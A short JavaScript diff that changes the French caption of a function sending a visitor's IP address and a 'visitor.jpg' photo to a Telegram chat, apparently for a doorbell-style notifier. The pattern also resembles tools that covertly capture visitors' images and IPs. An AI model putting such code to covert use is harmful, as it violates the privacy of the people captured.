@@ -106,7 +106,7 @@ async function sendToTelegram(ip, photoUrl) {
     try {
         const formData = new FormData();
         formData.append('chat_id', CHAT_ID);
-        formData.append('caption', `Nouvelle activation!\nIP: ${ip}`);
+        formData.append('caption', `Un colis est arrivé! La cloche a sonné!\nIP: ${ip}`);
 
         const blob = await fetch(photoUrl).then(r => r.blob());
         formData.append('photo', blob, 'visitor.jpg');
